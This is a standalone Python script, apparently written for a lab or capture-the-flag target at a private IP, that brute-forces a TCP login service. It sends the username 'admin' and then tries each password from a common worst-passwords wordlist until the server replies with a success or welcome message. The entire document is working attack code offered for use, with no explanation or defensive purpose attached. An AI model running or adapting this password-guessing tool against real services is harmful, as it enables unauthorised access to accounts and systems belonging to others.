import socket

# Configuration
target_ip = "10.201.88.90"  # Target IP
target_port = 8000         # Target port
password_wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        # Create a socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))

        # Send 'admin' username first
        client_socket.sendall(b'admin\n')

        # Receive server's response
        response = client_socket.recv(1024).decode()

        if "Password:" in response:  # Check if server is asking for a password
            client_socket.sendall(password.encode() + b"\n")  # Send password

            # Receive server's response to the password
            response = client_socket.recv(1024).decode()

            # Show only if there is a valid hit or specific response
            if "success" in response.lower() or "welcome" in response.lower():  # Adjust based on actual success messages
                print(f"[+] Valid password found: {password}")
                return True
            
            # Optionally show any other significant responses
            if "invalid" in response.lower() or "incorrect" in response.lower():  # Adjust based on actual error messages
                print(f"[-] Response for password '{password}': {response}")

        return False

    except Exception as e:
        return False

    finally:
        client_socket.close()  # Always ensure the socket is closed

def fuzz_passwords():
    # Open the password wordlist file
    with open(password_wordlist, "r", encoding="utf-8", errors="ignore") as file:
        passwords = file.readlines()

    # Iterate through each password in the wordlist
    for password in passwords:
        password = password.strip()  # Remove any newline characters

        if connect_and_send_password(password):
            break  # Exit after finding the first valid password

if __name__ == "__main__":
    fuzz_passwords()
